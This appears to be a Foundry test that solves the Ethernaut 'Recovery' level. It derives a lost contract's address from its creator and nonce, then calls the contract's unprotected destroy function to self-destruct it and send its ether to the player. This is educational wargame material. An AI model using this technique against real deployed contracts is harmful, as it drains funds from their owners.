// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "ds-test/test.sol";
import "../src/levels/Recovery/Recovery.sol";
import "../src/levels/Recovery/RecoveryFactory.sol";
import "../src/Ethernaut.sol";
import {Vm} from "forge-std/Vm.sol";

contract RecoveryTest is DSTest {
    Ethernaut ethernaut;
    RecoveryFactory recoveryFactory;
    Vm private constant vm = Vm(HEVM_ADDRESS);
    address eoa = address(69);

    function setUp() public {
        ethernaut = new Ethernaut();
        recoveryFactory = new RecoveryFactory();
        ethernaut.registerLevel(recoveryFactory);

        vm.deal(eoa, 1 ether);
    }

    function testIsRecoveryCleared() public {
        vm.startPrank(eoa);

        address instance = ethernaut.createLevelInstance{value: 0.001 ether}(
            recoveryFactory
        );

        address target = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            uint8(0xd6),
                            uint8(0x94),
                            instance,
                            uint8(0x01)
                        )
                    )
                )
            )
        );

        (bool destroySuccess, ) = target.call(
            abi.encodeWithSignature("destroy(address)", eoa)
        );
        require(destroySuccess, "destroy() failed");

        assertTrue(ethernaut.submitLevelInstance(payable(instance)));

        vm.stopPrank();
    }
}
